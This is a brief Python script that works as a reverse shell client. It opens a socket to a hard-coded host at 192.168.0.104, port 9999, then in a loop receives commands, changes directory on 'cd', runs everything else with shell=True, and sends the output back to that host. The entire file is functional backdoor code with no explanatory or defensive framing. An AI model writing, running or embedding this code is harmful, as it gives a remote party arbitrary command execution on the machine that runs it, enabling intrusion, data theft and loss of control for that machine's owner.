from socket import *
import os
import subprocess

s = socket()
host = "192.168.0.104"
port = 9999

s.connect((host,port))
while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == "cd":
        os.chdir(data[3:].decode("utf-8"))

    if len(data)>0:
        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_string = str(output_byte,"utf-8")
        current_dir = os.getcwd()+"> "
        s.send(str.encode(output_string+current_dir))
        print(output_string)

